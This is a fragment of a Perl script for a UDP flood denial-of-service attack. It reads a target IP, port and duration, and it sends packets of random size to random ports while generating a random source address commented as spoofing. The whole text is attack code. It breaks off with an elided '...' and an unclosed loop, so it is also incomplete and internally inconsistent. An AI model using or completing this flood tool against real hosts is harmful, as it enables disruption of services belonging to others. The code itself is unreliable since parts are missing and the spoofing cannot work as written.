#!/usr/bin/perl 
use Socket 
qw(inet_aton pack_sockaddr_in AF_INET SOCK_DGRAM); 
use strict;

my ($ip, $port, $time, $config) = @ARGV; my ($size, $psize, $iaddr, $endtime, $pport);

$size = int(rand(1024)); # randomize packet size within a range 
$psize = int(rand(1024)); # randomize packet size within a range
...
for (; time() <= $endtime;) { $psize = $size ? $size : int(rand(1024)); $pport = $port ? $port : int(rand(65535)) + 1; # using a larger range for port numbers

 
my $src_ip = join('.', map int rand 256, 1..4); # spoofing source IP 
